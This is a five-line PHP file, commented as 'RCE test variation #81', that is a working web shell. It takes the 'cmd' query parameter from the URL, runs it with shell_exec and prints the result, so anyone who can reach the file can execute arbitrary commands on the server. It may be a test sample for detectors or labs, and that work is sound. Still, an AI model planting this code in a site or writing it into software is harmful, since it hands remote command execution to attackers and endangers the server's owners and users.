<?php
// RCE test variation #81
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>